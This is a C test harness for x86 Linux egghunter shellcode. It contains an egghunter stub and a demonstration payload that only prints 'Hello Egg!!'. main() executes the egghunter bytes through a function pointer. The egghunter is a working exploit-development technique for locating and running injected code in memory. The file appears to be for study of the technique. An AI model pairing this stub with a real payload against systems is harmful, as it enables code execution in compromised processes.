#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
/* put your egg here twice */
"\x90\x50\x90\x50"
"\x90\x50\x90\x50"
/* payload here */
"\xeb\x16\x59\x31\xc0\x50\xb0\x04\x31\xdb\xb3\x01\x31\xd2\xb2\x0c\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe5\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x45\x67\x67\x21\x21\x5c\x6e\x0a";

unsigned char egghunter[] = \
//"\xbb\x90\x50\x90\x50\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\xff\xe2";
//"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
//"\x31\xc9\xf7\xe1\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
"\x31\xd2\x31\xc9\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";

main()
{

	printf("Shellcode Length:  %d\n", strlen(shellcode));
        printf("Egghunter Length:  %d\n", strlen(egghunter));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
 
